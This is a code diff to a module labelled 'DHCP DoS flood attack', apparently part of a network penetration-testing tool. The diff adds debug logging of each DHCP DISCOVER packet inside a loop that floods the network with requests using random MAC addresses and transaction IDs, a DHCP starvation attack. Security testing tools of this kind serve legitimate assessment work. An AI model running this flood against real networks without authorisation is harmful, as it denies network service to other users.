@@ -1,5 +1,11 @@
 import time
-from ptsrvtester.protocols.dhcp.utils.registry import sendp, prepare_discover_packet, random_xid, random_mac
+from ptsrvtester.protocols.dhcp.utils.registry import (
+    sendp,
+    prepare_discover_packet,
+    random_xid,
+    random_mac,
+    debug_packet
+)
 
 
 __MODULELABEL__ = "DHCP DoS flood attack"
@@ -18,7 +24,9 @@ def _run_denial(ctx):
         duration = ctx.duration if hasattr(ctx, 'duration') and ctx.duration else None
 
         while duration is None or (time.time() - start_time) < duration:
-            sendp(prepare_discover_packet(ctx.mac or random_mac(), ctx.xid or random_xid()),
+            discover_pkt = prepare_discover_packet(ctx.mac or random_mac(), ctx.xid or random_xid())
+            debug_packet(ctx, "Sent", discover_pkt)
+            sendp(discover_pkt,
                   iface=ctx.interface, verbose=False)
             count += 1
 
